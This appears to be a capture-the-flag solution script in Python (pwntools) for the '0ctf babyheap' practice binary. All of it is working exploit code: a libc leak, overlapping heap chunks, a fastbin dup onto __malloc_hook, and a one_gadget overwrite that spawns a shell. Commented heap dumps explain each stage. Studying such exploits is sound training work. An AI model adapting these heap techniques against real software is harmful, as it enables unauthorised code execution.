#!/usr/bin/env python3


from pwn import *


elf = ELF('./0ctfbabyheap_patched')

libc = elf.libc

gs = '''
    handle SIGALRM ignore
    continue
'''


# context.log_level = 'debug'

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return elf.process()


io = start()


def alloc(size):
    io.sendlineafter(b'Command: ', b'1')
    io.sendlineafter(b'Size: ', f'{size}'.encode())
    io.recvuntil(b'Allocate Index ')
    index = int(io.recvline().strip())
    return index

def free(index):
    io.sendlineafter(b'Command: ', b'3')
    io.sendlineafter(b'Index: ', f'{index}'.encode())


# make sure to send exactly the number of bytes you specify 

def fill(index, size, data):
    io.sendlineafter(b'Command: ', b'2')
    io.sendlineafter(b'Index: ', f'{index}'.encode())
    io.sendlineafter(b'Size: ', f'{size}'.encode())
    io.sendafter(b'Content: ', data)

def dump(index):
    io.sendlineafter(b'Command: ', b'4')
    io.sendlineafter(b'Index: ', f'{index}'.encode())
    io.recvuntil(b'Content: \n')
    return io.recvline()


# LEAK LIBC

chunk_A = alloc(0x18)

chunk_B = alloc(0x88)

chunk_C = alloc(0x68) 

chunk_D = alloc(0x68)
chunk_E = alloc(0x18) # prevent consolidation with top chunk

free(chunk_B);

fill(chunk_A, 0x19, b'A'*0x18 + p8(0x92)) # set chunk_B's mmap flag 


chunk_F = alloc(0x88)

leak = dump(chunk_F)

libc.address = u64(leak[0:8]) - 0x3c4b78

log.success(f'libc @ 0x{libc.address:02x}')

# Fastbin_Dup technique

'''
0x555555604000:	0x0000000000000000	0x0000000000000021 ----> chunk_A
0x555555604010:	0x4141414141414141	0x4141414141414141
0x555555604020:	0x4141414141414141	0x0000000000000092 ----> chunk_F
0x555555604030:	0x00007ffff7bc4b78	0x00007ffff7bc4b78
0x555555604040:	0x0000000000000000	0x0000000000000000
0x555555604050:	0x0000000000000000	0x0000000000000000
0x555555604060:	0x0000000000000000	0x0000000000000000
0x555555604070:	0x0000000000000000	0x0000000000000000
0x555555604080:	0x0000000000000000	0x0000000000000000
0x555555604090:	0x0000000000000000	0x0000000000000000
0x5555556040a0:	0x0000000000000000	0x0000000000000000
0x5555556040b0:	0x0000000000000090	0x0000000000000071 ----> chunk_C
0x5555556040c0:	0x0000000000000000	0x0000000000000000
0x5555556040d0:	0x0000000000000000	0x0000000000000000
0x5555556040e0:	0x0000000000000000	0x0000000000000000
0x5555556040f0:	0x0000000000000000	0x0000000000000000
0x555555604100:	0x0000000000000000	0x0000000000000000
0x555555604110:	0x0000000000000000	0x0000000000000000
0x555555604120:	0x0000000000000000	0x0000000000000071 ----> chunk_D
0x555555604130:	0x0000000000000000	0x0000000000000000
0x555555604140:	0x0000000000000000	0x0000000000000000
0x555555604150:	0x0000000000000000	0x0000000000000000
0x555555604160:	0x0000000000000000	0x0000000000000000
0x555555604170:	0x0000000000000000	0x0000000000000000
0x555555604180:	0x0000000000000000	0x0000000000000000
0x555555604190:	0x0000000000000000	0x0000000000000021 ----> chunk_E
0x5555556041a0:	0x0000000000000000	0x0000000000000000
0x5555556041b0:	0x0000000000000000	0x0000000000020e51
'''

# create overlapping chunks by overwriting chunk_E's size field with 0x90+0x70

data = b'A'*0x18 + p64(0x90+0x70+0x1)

fill(chunk_A, len(data), data)

free(chunk_F)

chunk_G = alloc(0x88)

chunk_H = alloc(0x68)

fill(chunk_H, 0x10, b'G'*0x10)

'''
0x555555604000:	0x0000000000000000	0x0000000000000021 ----> chunk_A
0x555555604010:	0x4141414141414141	0x4141414141414141
0x555555604020:	0x4141414141414141	0x0000000000000091 ----> chunk_G
0x555555604030:	0x0000000000000000	0x0000000000000000
0x555555604040:	0x0000000000000000	0x0000000000000000
0x555555604050:	0x0000000000000000	0x0000000000000000
0x555555604060:	0x0000000000000000	0x0000000000000000
0x555555604070:	0x0000000000000000	0x0000000000000000
0x555555604080:	0x0000000000000000	0x0000000000000000
0x555555604090:	0x0000000000000000	0x0000000000000000
0x5555556040a0:	0x0000000000000000	0x0000000000000000
0x5555556040b0:	0x0000000000000000	0x0000000000000071 ----> chunk_H, chunk_C
0x5555556040c0:	0x4747474747474747	0x4747474747474747
0x5555556040d0:	0x0000000000000000	0x0000000000000000
0x5555556040e0:	0x0000000000000000	0x0000000000000000
0x5555556040f0:	0x0000000000000000	0x0000000000000000
0x555555604100:	0x0000000000000000	0x0000000000000000
0x555555604110:	0x0000000000000000	0x0000000000000000
0x555555604120:	0x0000000000000000	0x0000000000000071 ----> chunk_D
0x555555604130:	0x0000000000000000	0x0000000000000000
0x555555604140:	0x0000000000000000	0x0000000000000000
0x555555604150:	0x0000000000000000	0x0000000000000000
0x555555604160:	0x0000000000000000	0x0000000000000000
0x555555604170:	0x0000000000000000	0x0000000000000000
0x555555604180:	0x0000000000000000	0x0000000000000000
0x555555604190:	0x0000000000000000	0x0000000000000021 ----> chunk_E
0x5555556041a0:	0x0000000000000000	0x0000000000000000
0x5555556041b0:	0x0000000000000000	0x0000000000020e51 ----> top chunk
'''


free(chunk_C)
free(chunk_D)
free(chunk_H)

chunk_I = alloc(0x68)

fake_chunk = libc.sym.__malloc_hook-35

fill(chunk_I, 0x8, p64(fake_chunk)) # tamper with fastbin chunk_I's FD to point to __malloc_hook-35


chunk_J = alloc(0x68)
chunk_K = alloc(0x68)

chunk_L = alloc(0x68) # this overlaps __malloc_hook

one_gadget = libc.address + 0x4526a
data = b'A'*0x13 + p64(one_gadget)

fill(chunk_L, len(data), data)

io.sendlineafter(b'Command: ', b'1')
io.sendlineafter(b'Size: ', b'24') # trigger a call to malloc() ---> system()
io.interactive()
